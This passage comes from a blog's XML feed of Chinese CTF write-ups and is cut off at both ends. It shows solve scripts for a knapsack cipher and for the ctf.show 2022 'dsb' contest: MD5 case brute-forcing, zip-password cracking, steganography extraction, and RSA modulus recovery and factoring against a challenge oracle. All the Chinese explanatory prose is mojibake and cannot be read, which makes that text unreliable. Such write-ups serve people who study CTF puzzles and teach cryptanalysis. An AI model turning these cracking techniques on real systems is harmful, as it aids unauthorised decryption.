ai=e*U[i]+f*V[i]<br>        pk.append(<span class="hljs-built_in">int</span>(ai))<br>    <span class="hljs-keyword">return</span> pk,sk<br>Pk,Sk=keygen()<br><span class="hljs-built_in">print</span>(Pk)<br><span class="hljs-built_in">print</span>(Sk)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Encrypt</span>(<span class="hljs-params">plain,pk</span>):<br>    mbin=<span class="hljs-built_in">bin</span>(plain)[<span class="hljs-number">2</span>:]<br>    c=<span class="hljs-number">0</span><br>    mbin=pad(mbin,Baglenth)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(Baglenth):<br>        c=c+<span class="hljs-built_in">int</span>(mbin[i])*pk[i]<br>    <span class="hljs-keyword">return</span> c<br>c=Encrypt(message,Pk)<br><span class="hljs-built_in">print</span>(c)<br><br><span class="hljs-comment"># c = 1475864207352419823225329328555476398971654057144688193866218781853021651529290611526242518</span><br><br><span class="hljs-comment"># è¿™é‡Œprint(sk,pk)è¾“å‡ºçš„æ•°æ®æˆ‘æ²¡æœ‰å¤åˆ¶è¿‡æ¥ã€‚è¿™ä¸ªç¨‹åºä½ è·‘ä¸€è¾¹å°±èƒ½å¾—åˆ°é‚£äº›æ•°æ®äº†ã€‚</span><br></code></pre></td></tr></table></figure><p>æ‰¾åˆ°äº†ç›¸å…³çš„èµ„æ–™ï¼š</p><p><a href="https://blog.csdn.net/qq_43968080/article/details/102953485">https://blog.csdn.net/qq_43968080/article/details/102953485</a></p><p>å¯ä»¥çœ‹åˆ°ä»£ç ä¸­çš„Bagå¾ˆæ˜æ˜¾ç¬¦åˆè¿™ä¸ªè¶…å¢é‡èƒŒåŒ…è¿™ä¸ªæ¦‚å¿µï¼Œè¯´æ˜è¿™ä¸ªé­”æ”¹çš„èƒŒåŒ…å…¬é’¥ç®—æ³•ã€‚è€Œè§‚å¯ŸèƒŒåŒ…å…¬é’¥ç®—æ³•çš„è§£å¯†éƒ¨åˆ†ï¼Œéœ€è¦çš„æ±‚ä¸€ä¸ªé€†è®©å¯†æ–‡ä¸è¿™ä¸ªé€†è¿›è¡Œæ¨¡ä¹˜è¿ç®—ï¼Œæœ€åä½¿ç”¨è¶…å¢é‡çš„æ–¹å¼è¿›è¡Œè´ªå¿ƒéå†å³å¯å¾—åˆ°è§£ã€‚</p><p>åŸæœ¬æƒ³äº†ä¸€ä¸‹ï¼ŒPkæœ¬èº«ä¸å°±æ˜¯ä¸€ä¸ªè¶…å¢é‡èƒŒåŒ…å—ï¼Œä¸èƒ½ç›´æ¥è¿›è¡Œæ’åºæ±‚è§£å—ï¼Œç»“æœè¿˜çœŸä¸è¡Œã€‚</p><p>çœ‹ä¸€ä¸‹skéƒ½ç»™äº†äº›ä»€ä¹ˆï¼Œm,wå’Œe,féƒ½ç»™äº†ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(Baglenth):<br>    di=(w*Bag[i])%m<br>    D.append(di)<br>    bindi=<span class="hljs-built_in">bin</span>(di)[<span class="hljs-number">2</span>:]<br>    bindi=pad(bindi,h)<br>    binD.append(bindi)<br></code></pre></td></tr></table></figure><p>æŸ¥äº†æŸ¥èµ„æ–™æƒ³ç”¨LLLç®—æ³•ç›´æ¥æ¢­å“ˆä¸€æŠŠï¼Œå¯æƒœæ²¡èƒ½æˆåŠŸã€‚(æ•°å­¦åŠŸåº•å¤ªå·®äº†ï¼Œçœ‹ä¸æ‡‚ç»“æœï¼Œæˆ‘è§‰å¾—ç­”æ¡ˆåº”è¯¥åœ¨è¾“å‡ºçš„ç»“æœä¸­ï¼Œä½†æ˜¯æˆ‘ä¸çŸ¥é“æ˜¯å“ªä¸€ä¸ªã€‚)</p>]]></content>
    
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>writeup</tag>
      
      <tag>Crypto</tag>
      
      <tag>MISC</tag>
      
      <tag>Reverseï¼Œ PWNï¼Œ Web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>å•èº«æ¯(dsb) 2022</title>
    <link href="/2022/05/22/%E5%8D%95%E8%BA%AB%E6%9D%AF-dsb-2022/"/>
    <url>/2022/05/22/%E5%8D%95%E8%BA%AB%E6%9D%AF-dsb-2022/</url>
    
    <content type="html"><![CDATA[<p>ctf.showçš„2022å•èº«æ¯ä¸­ æ²¡å¤§æ²¡å°çš„ä¸²ä¸²ã€miscç­¾åˆ°ã€å¤å…¸baseã€TooYoungRSAã€reç­¾åˆ°ã€magicã€pwnç­¾åˆ°çš„é¢˜è§£ã€‚</p><span id="more"></span><img src="https://s2.loli.net/2022/05/20/qSLBC9fJPiw5RaE.jpg" alt="æˆ‘çš„520" style="zoom: 33%;" /><p>æˆ‘è§‰å¾—æˆ‘è¿èŒæ–°éƒ½ä¸å¦‚â€¦</p><h1 id="misc"><a class="markdownIt-Anchor" href="#misc"></a> MISC</h1><h2 id="æ²¡å¤§æ²¡å°çš„ä¸²ä¸²"><a class="markdownIt-Anchor" href="#æ²¡å¤§æ²¡å°çš„ä¸²ä¸²"></a> æ²¡å¤§æ²¡å°çš„ä¸²ä¸²</h2><figure class="highlight sqf"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><pre><code class="hljs sqf">æè¿°:<br>æ‰“ä¹±äº†å¤§å°å†™çš„<span class="hljs-built_in">flag</span>æ˜¯ y0U_RE4lLy_kn0W_TH1S_ConGr4tUlAT10Ns<br>å…¶ä¸­æ­£ç¡®çš„<span class="hljs-built_in">flag</span>çš„md5æ˜¯ <span class="hljs-number">7513209051</span>f455fa44d0fa5cd0f3e051<br></code></pre></td></tr></table></figure><p>å†™ä¸ªçˆ†ç ´è„šæœ¬è·‘å°±è¡Œäº†ã€‚æˆ‘è‡ªå·±ä¸çŸ¥é“æœ‰ä»€ä¹ˆå¥½çš„ç¬›å¡å°”ä¹˜ç§¯çš„ç”Ÿæˆæ–¹æ³•ã€‚æ‰€ä»¥è¿™ä¸ªä»£ç ä¸å¤ªå¥½çœ‹â€¦</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># solve.py</span><br><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">import</span> itertools<br><br>data1 = <span class="hljs-string">&quot;y0U_RE4lLy_kn0W_TH1S_ConGr4tUlAT10Ns&quot;</span>.upper()<br>data2 = data1.lower()<br><br>data = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(data1)):<br>    <span class="hljs-keyword">if</span> data1[i] <span class="hljs-keyword">in</span> [<span class="hljs-string">&quot;_&quot;</span>,<span class="hljs-string">&quot;0&quot;</span>, <span class="hljs-string">&quot;4&quot;</span>,<span class="hljs-string">&quot;1&quot;</span>]:<br>        data.append([data1[i]])<br>        <span class="hljs-keyword">continue</span><br>    data.append([data1[i], data2[i]])<br><br>x = itertools.product(data[<span class="hljs-number">0</span>],data[<span class="hljs-number">1</span>],data[<span class="hljs-number">2</span>],data[<span class="hljs-number">3</span>],data[<span class="hljs-number">4</span>],data[<span class="hljs-number">5</span>],data[<span class="hljs-number">6</span>],data[<span class="hljs-number">7</span>],<br>                  data[<span class="hljs-number">8</span>],data[<span class="hljs-number">9</span>],data[<span class="hljs-number">10</span>],data[<span class="hljs-number">11</span>],data[<span class="hljs-number">12</span>],data[<span class="hljs-number">13</span>],data[<span class="hljs-number">14</span>],data[<span class="hljs-number">15</span>],<br>                  data[<span class="hljs-number">16</span>],data[<span class="hljs-number">17</span>],data[<span class="hljs-number">18</span>],data[<span class="hljs-number">19</span>],data[<span class="hljs-number">20</span>],data[<span class="hljs-number">21</span>],data[<span class="hljs-number">22</span>],data[<span class="hljs-number">23</span>],<br>                  data[<span class="hljs-number">24</span>],data[<span class="hljs-number">25</span>],data[<span class="hljs-number">26</span>],data[<span class="hljs-number">27</span>],data[<span class="hljs-number">28</span>],data[<span class="hljs-number">29</span>],data[<span class="hljs-number">30</span>],data[<span class="hljs-number">31</span>],<br>                  data[<span class="hljs-number">32</span>],data[<span class="hljs-number">33</span>],data[<span class="hljs-number">34</span>],data[<span class="hljs-number">35</span>])<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> x:<br>    <span class="hljs-keyword">if</span> hashlib.md5(<span class="hljs-string">&quot;&quot;</span>.join(i).encode(<span class="hljs-string">&quot;utf8&quot;</span>)).hexdigest() == <span class="hljs-string">&quot;7513209051f455fa44d0fa5cd0f3e051&quot;</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&quot;</span>.join(i))<br>        <span class="hljs-keyword">break</span><br>        <br><span class="hljs-comment"># y0U_Re4llY_kN0w_TH1s_coNgr4TULat10nS</span><br><span class="hljs-comment"># ctfshow&#123;y0U_Re4llY_kN0w_TH1s_coNgr4TULat10nS&#125;</span><br></code></pre></td></tr></table></figure><h2 id="miscç­¾åˆ°"><a class="markdownIt-Anchor" href="#miscç­¾åˆ°"></a> miscç­¾åˆ°</h2><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sqf">é‡è¦æç¤ºï¼š<br>å‹ç¼©åŒ…å¯†ç æ˜¯<span class="hljs-number">5</span>ä½å­—ç¬¦<br>lsbæœ‰å†…å®¹<br><span class="hljs-built_in">flag</span>åŒ…å«<span class="hljs-number">5</span>ä¸ªç©ºæ ¼ã€<span class="hljs-number">2</span>ä¸ªé€—å·ï¼Œå‡æ›¿æ¢ä¸ºä¸‹åˆ’çº¿ï¼Œè¿ç»­åªç•™<span class="hljs-number">1</span>ä¸ªä¸‹åˆ’çº¿<br></code></pre></td></tr></table></figure><p>å‹ç¼©åŒ…ç›´æ¥çˆ†ç ´å¯†ç ã€‚</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><span class="hljs-symbol">61f@</span>X<br></code></pre></td></tr></table></figure><p>ç„¶åä»–è¯´lsbé‡Œé¢æœ‰å†…å®¹ï¼Œç›´æ¥stegosolveæŠ“lsbç»“æœå•¥éƒ½æ²¡æ‰¾åˆ°ï¼Œæ€€ç–‘ä¸ä¼šè—åœ¨ä¸­é—´éƒ¨åˆ†äº†ã€‚ç»“æœçœ‹äº†ä¸€åœˆlsbéƒ½æ²¡æ‰¾åˆ°æœ‰ç”¨çš„ä¿¡æ¯â€¦</p><p>æœ€åç›´æ¥æŸ¥çœ‹äºŒè¿›åˆ¶çš„å›¾ç‰‡å‘ç°æ–‡ä»¶å°¾éƒ¨é™„ä¸Šäº†ä¸€æ®µbase64ã€‚çœ‹æ¥åšé¢˜è¿˜å¾—èµ°ä¸€ä¸ªæ ‡å‡†æµç¨‹ï¼ŒæŒ‡ä¸å®šå°±å¿˜äº†â€¦</p><p>å¾—åˆ°çš„base64 cyberchefè½¬æ¢ä¸€ä¸‹ã€‚æ˜¯ä¸€ä¸ªç¼ºå°‘å®šä½æ ‡çš„äºŒç»´ç ã€‚</p><p>å…ˆæŠŠå®šä½æ ‡è¡¥ä¸Šã€‚å—¯å¥½åƒè¿™ä¸ªäºŒç»´ç æœ‰ç‚¹ä¸å¤ªç¬¦åˆè§„èŒƒï¼ŒæŒ‰ç†æ¥è¯´å®šä½æ ‡é™„è¿‘å®è¦ç•™ç™½çš„ï¼Œè¿™é‡Œç¡®å®é»‘è‰²ã€‚æ‰€ä»¥ç°å°†äºŒç»´ç åè‰²å†æ·»åŠ ã€‚</p><p>å¾—åˆ°ï¼š</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey"><span class="hljs-number">6</span>C75652C20666172206578636565647320796F75722062656C6965667D<br><span class="hljs-built_in">lue,</span> far exceeds your belief&#125;<br></code></pre></td></tr></table></figure><p>è¿™ä¸ªåªæ˜¯ä¸€éƒ¨åˆ†çš„ï¼Œé‚£ä¹ˆè¿˜ç¼ºå°‘ä¸€éƒ¨åˆ†ã€‚</p><p>åˆ°è¿™é‡Œåªæœ‰LSBçš„æç¤ºæ²¡æœ‰ç”¨äº†ï¼Œæ‰€ä»¥çŒœæµ‹æ˜¯lsbã€‚StegoSolveçœ‹è¿™ä¸ªäºŒç»´ç æ²¡æ‰¾åˆ°ï¼Œé‚£åº”è¯¥æ˜¯è½¯ä»¶éšå†™ã€‚ä¸€åœˆè½¯ä»¶ç…§ä¸‹æ¥éƒ½æ²¡æ‰¾åˆ°â€¦</p><p>æœ€åå†ç½‘ä¸ŠæœLSBå·¥å…·çš„æ—¶å€™æ‰¾åˆ°ä¸ªzstegï¼Œè¿™ä¸ªæˆ‘è¿˜æ²¡ç”¨è¿‡ï¼Œä¸è¿‡çœ‹è¯„ä»·è¿˜æŒºä¸é”™ï¼Ÿ</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs shell">â”Œâ”€â”€(kaliã‰¿kali)-[~/CTF/dsb]<br>â””â”€$ zsteg -a download.png<br>b6,abgr,msb,xy      .. file: MPEG ADTS, layer I, v2, 112 kbps, Monaural<br>b7,abgr,lsb,xy      .. file: , 48 kHz, Monaural<br>b8,rgb,msb,xy       .. file: RDI Acoustic Doppler Current Profiler (ADCP)<br>b8,rgba,msb,xy      .. file: RDI Acoustic Doppler Current Profiler (ADCP)<br>b1,r,lsb,xy,prime   .. file: MPEG ADTS, layer II, v1, 112 kbps, Stereo<br>b1,r,lsb,yx         .. text: &quot;ctfshow&#123;Your potential,va&quot;<br>b6,abgr,msb,yx      .. file: MPEG ADTS, layer I, v2, 112 kbps, Monaural<br>b7,abgr,lsb,yx      .. file: , 48 kHz, Monaural<br><br></code></pre></td></tr></table></figure><p>è¿™é‡Œèƒ½çœ‹åˆ°æˆ‘ä»¬çš„flagäº†ã€‚å¥½åƒç¡®å®æŒºå¥½ç”¨çš„ï¼Ÿ å·¥å…·+1</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment"># ctfshow&#123;Your potential,value, far exceeds your belief&#125;</span><br></code></pre></td></tr></table></figure><p>ç„¶åå¿˜äº†æ¢é‡Œé¢çš„å­—ç¬¦äº†â€¦</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-meta"># ctfshow&#123;Your_potential_value_far_exceeds_your_belief&#125;</span><br></code></pre></td></tr></table></figure><h1 id="crypto"><a class="markdownIt-Anchor" href="#crypto"></a> Crypto</h1><h2 id="å¤å…¸base"><a class="markdownIt-Anchor" href="#å¤å…¸base"></a> å¤å…¸base</h2><p>æˆ‘è¿™è¾¹å¾—åˆ°çš„ä¿¡æ¯æ˜¯ï¼š</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">YRchdsYIYNY0ZALQZYYIY0NUNQMZNNC</span><span class="hljs-operator">=</span><span class="hljs-number">3</span>m2v3wj0zjS0j4T4DtjwiyDymy2l29g<span class="hljs-operator">=</span><br></code></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°ä¸¤ä¸ª==ä½ç½®ä¸å¯¹ï¼Œèƒ½è¿™æ ·æ”¹å˜å­—ç¬¦ä½ç½®çš„ï¼Œåº”è¯¥æ˜¯æ …æ å¯†ç ï¼Œåˆ†ç»„é•¿åº¦åº”è¯¥ä¸º2</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">Y<span class="hljs-number">3</span>Rmc<span class="hljs-number">2</span>hvd<span class="hljs-number">3</span>swYjI<span class="hljs-number">0</span>Yz<span class="hljs-symbol">NjYS00</span>ZjA<span class="hljs-number">4</span>LTQ<span class="hljs-number">4</span>ZDYtYjIwYi<span class="hljs-number">0</span>y<span class="hljs-symbol">NDUyNmQyM2</span>Zl<span class="hljs-symbol">N2</span><span class="hljs-symbol">N9</span>Cg==<br></code></pre></td></tr></table></figure><p>base64è§£å¯†</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ctfshow</span>&#123;<span class="hljs-number">0</span>b24c3ca-<span class="hljs-number">4</span>f08-<span class="hljs-number">48</span>d6-b20b-<span class="hljs-number">24526</span>d23fe7c&#125;<br></code></pre></td></tr></table></figure><h2 id="tooyoungrsa"><a class="markdownIt-Anchor" href="#tooyoungrsa"></a> TooYoungRSA</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> nevergonnagiveyouup <span class="hljs-keyword">import</span> n, e<br><span class="hljs-keyword">import</span> secrets<br><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> sha256<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><span class="hljs-keyword">from</span> Crypto.Util.Padding <span class="hljs-keyword">import</span> pad<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;flag.txt&quot;</span>, <span class="hljs-string">&quot;rb&quot;</span>) <span class="hljs-keyword">as</span> f:<br>        flag = f.read().strip()<br><br>    k = secrets.randbelow(n)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;ck = <span class="hljs-subst">&#123;<span class="hljs-built_in">pow</span>(k, e, n)&#125;</span>&quot;</span>)<br>    key = sha256(<span class="hljs-built_in">str</span>(k).encode()).digest()<br>    cipher = AES.new(key, AES.MODE_ECB)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;ct = <span class="hljs-subst">&#123;cipher.encrypt(pad(flag, AES.block_size)).<span class="hljs-built_in">hex</span>()&#125;</span>&quot;</span>)<br>    <br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        nevergonnaletyoudown = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;I just wanna tell you how i&#x27;m feeling... &quot;</span>))<br>        <span class="hljs-keyword">assert</span> nevergonnaletyoudown &gt;= <span class="hljs-number">0</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;gotta make you understand: <span class="hljs-subst">&#123;<span class="hljs-built_in">pow</span>(nevergonnaletyoudown, e, n)&#125;</span>&quot;</span>)<br></code></pre></td></tr></table></figure><p>é“¾æ¥nc</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs shell">F:\CTFTools\yafu-1.34&gt;nc pwn.challenge.ctf.show 28155<br>ck = 53830851938944413421825489946783740501<br>ct = 2d67acfe897ac185cfff0beeaf38856356bc0e0a67f253e4da25129c6c409cde165657e156ab7386060222951a532176<br>I just wanna tell you how i&#x27;m feeling...<br>2<br>gotta make you understand: 9088662731338809664100216653347181076<br>I just wanna tell you how i&#x27;m feeling...<br>4<br>gotta make you understand: 61547101391097434247253645201221024635<br>I just wanna tell you how i&#x27;m feeling...<br>8<br>gotta make you understand: 9368775312576566895016755847461863720<br>I just wanna tell you how i&#x27;m feeling...<br>16<br>gotta make you understand: 75933324863129460082479849068964500501<br>I just wanna tell you how i&#x27;m feeling...<br></code></pre></td></tr></table></figure><p>é€‰æ‹©æ˜æ–‡æ”»å‡»</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">from</span> gmpy2 import gcd<br><br><span class="hljs-attribute">c2</span> = <span class="hljs-number">9088662731338809664100216653347181076</span><br><span class="hljs-attribute">c4</span> = <span class="hljs-number">61547101391097434247253645201221024635</span><br><span class="hljs-attribute">c8</span> = <span class="hljs-number">9368775312576566895016755847461863720</span><br><span class="hljs-attribute">c16</span> = <span class="hljs-number">75933324863129460082479849068964500501</span><br><br><span class="hljs-attribute">dif1</span> = pow(c2,<span class="hljs-number">2</span>) - c4<br><span class="hljs-attribute">dif2</span> = pow(c2,<span class="hljs-number">3</span>) - c8<br><span class="hljs-attribute">dif3</span> = pow(c2,<span class="hljs-number">4</span>) - c16<br><br><br><span class="hljs-attribute">n</span> = gcd(gcd(dif1,dif2), gcd(dif2,dif3))<br><span class="hljs-attribute">print</span>(<span class="hljs-string">&quot;n = &quot;</span>, n)<br><br><span class="hljs-attribute">e</span> = <span class="hljs-number">1</span><br><span class="hljs-attribute">while</span> pow(<span class="hljs-number">2</span>, e, n) != c2:<br>    <span class="hljs-attribute">e</span> += <span class="hljs-number">1</span><br><span class="hljs-attribute">print</span>(<span class="hljs-string">&quot;e = &quot;</span>, e)<br><br><span class="hljs-comment"># n =  190128968349217409128719777740062362481</span><br><span class="hljs-comment"># e =  652019</span><br></code></pre></td></tr></table></figure><p>è¿™é‡Œå…¶å®åªç”¨ä¸¤ä¸ªdifåšGCDä¹Ÿå¯ä»¥çš„ã€‚å¦‚æœeè·‘çš„æ—¶é—´æ¯”è¾ƒä¹…çš„è¯ï¼Œå¯ä»¥è€ƒè™‘é‡æ–°è·å–æ•°æ®ï¼Œé‡æ–°è¿ä¸€ä¸‹ncï¼Œä»–ä¼šé‡æ–°ç”Ÿæˆnå’Œeçš„ã€‚</p><p>å¾—åˆ°çš„nç”¨yafuåˆ†è§£ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs shell">starting SIQS on c39: 190128968349217409128719777740062362481<br><br>==== sieving in progress (1 thread):     624 relations needed ====<br>====           Press ctrl-c to abort and save state           ====<br>518 rels found: 285 full + 233 from 2212 partial, (30808.14 rels/sec)<br><br>SIQS elapsed time = 0.1090 seconds.<br>Total factoring time = 0.2692 seconds<br><br><br>***factors found***<br><br>P20 = 14093563172030264239<br>P20 = 13490482571968928479<br><br>ans = 1<br></code></pre></td></tr></table></figure><p>æœ€åæ±‚dï¼Œç„¶åAESè§£å¯†å³å¯ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> gcd, invert, powmod<br><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> sha256<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><br>n =  <span class="hljs-number">190128968349217409128719777740062362481</span><br>p = <span class="hljs-number">14093563172030264239</span><br>q = <span class="hljs-number">13490482571968928479</span><br>e =  <span class="hljs-number">652019</span><br><br>d = invert(e, (p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>))<br><br>ck = <span class="hljs-number">53830851938944413421825489946783740501</span><br>ct = <span class="hljs-string">&quot;2d67acfe897ac185cfff0beeaf38856356bc0e0a67f253e4da25129c6c409cde165657e156ab7386060222951a532176&quot;</span><br><br>k = powmod(ck,d,n)<br>key = sha256(<span class="hljs-built_in">str</span>(k).encode()).digest()<br>cipher = AES.new(key, AES.MODE_ECB)<br><br><span class="hljs-built_in">print</span>(cipher.decrypt(<span class="hljs-built_in">bytes</span>.fromhex(ct)))<br><br><span class="hljs-comment"># ctfshow&#123;8dcb976f-5e92-4d36-89ac-c2273bf442e1&#125;</span><br></code></pre></td></tr></table></figure><h1 id="reverse"><a class="markdownIt-Anchor" href="#reverse"></a> Reverse</h1><h2 id="reç­¾åˆ°"><a class="markdownIt-Anchor" href="#reç­¾åˆ°"></a> reç­¾åˆ°</h2><p>IDAæ‰“å¼€é‡Œé¢æœ‰ä¸ªå¾ˆåƒbase64çš„å­—ç¬¦ä¸²ï¼Œæ‹‰å‡ºæ¥base64è§£å¯†å³å¯å¾—åˆ°flagã€‚</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs makefile">V2toT2FWZ3pTbXhZTTA1d1dqSTFabUZYTldaaFNFNTZZek5PZW1NelRucGpkejA5<br><span class="hljs-section">decode:</span><br>WkhOaVgzSmxYM05wWjI1ZmFXNWZhSE56YzNOemMzTnpjdz09<br><span class="hljs-section">decode:</span><br>ZHNiX3JlX3NpZ25faW5faHNzc3Nzc3Nzcw==<br><span class="hljs-section">decode:</span><br>dsb_re_sign_in_hsssssssss<br><br><span class="hljs-comment"># ctfshow&#123;dsb_re_sign_in_hsssssssss&#125;</span><br></code></pre></td></tr></table></figure><h2 id="magic"><a class="markdownIt-Anchor" href="#magic"></a> magic</h2><p>é¢˜ç›®ä¿¡æ¯ï¼š</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">3</span>ä¸ªå¯†ç åªæœ‰<span class="hljs-number">1</span>ä¸ªæ˜¯æ­£ç¡®çš„<br></code></pre></td></tr></table></figure><p>é€†å‘ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v5; <span class="hljs-comment">// [rsp+4h] [rbp-Ch] BYREF</span><br>  <span class="hljs-type">unsigned</span> __int64 v6; <span class="hljs-comment">// [rsp+8h] [rbp-8h]</span><br><br>  v6 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;plz input your password:&quot;</span>);<br>  